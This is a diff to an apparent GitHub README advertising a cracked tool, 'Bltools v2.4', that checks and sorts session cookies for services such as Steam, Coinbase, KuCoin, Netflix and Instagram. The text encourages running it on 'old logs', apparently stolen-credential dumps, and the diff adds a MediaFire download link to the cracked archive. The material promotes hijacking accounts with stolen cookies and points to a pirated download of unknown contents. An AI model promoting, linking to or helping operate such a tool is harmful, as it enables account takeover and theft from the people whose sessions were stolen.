@@ -2,7 +2,7 @@
 Last version of Bltools_v2.4 FULL CRACK 
 
 1. Cookie checker for many services - a unique check method that allows you to work without a proxy and at the same time your cookies remain alive. It finds a valid session and checks for all possible information, and also sorts it in a convenient order into different folders and text files. So that you can easily find what you need. Before checking cookies for validity, the program determines whether the required string for authorization is found, thus the speed of work is very high. We do not waste time checking cookies that do not contain information for authorization and do not send unnecessary requests.
-Services: Steam,Roblox,HumbleBundle,Hellstore,Csgocases,FreeBTC,Coinbase,HitBTC,KuCoin,Kryptex,Poloniex,YouTube,Twitch,TikTok,Instagram,Twitter,Facebook,Netflix,Amazon all countries),WordPress,PathOfExile,PSN,PornHub
+Services: Steam,Roblox,HumbleBundle,FreeBTC, HitBTC,KuCoin,Kryptex,Poloniex,YouTube,Twitch,TikTok,Instagram,Twitter,Facebook,Netflix,Amazon all countries),WordPress,PathOfExile,PSN,PornHub
 The most extensive check and sorting of all information into different folders and text files.
 
 2. Search and sorting cookies - allows you to easily and quickly select the desired cookies with the desired service.
@@ -24,3 +24,5 @@ This checker will find something that no other checker will find.
 You can easily recoup the program by checking your old logs.
 
 ![photo_2023-05-17_11-55-41](https://github.com/CracksSoftware/Bltools/assets/135487070/c8f80b69-7d4e-48dc-9379-12a453209bd0)
+[
+https://www.mediafire.com/file/af4l0qvkexyu2hp/BLTools_v2.4.rar](DOWNLOAD)
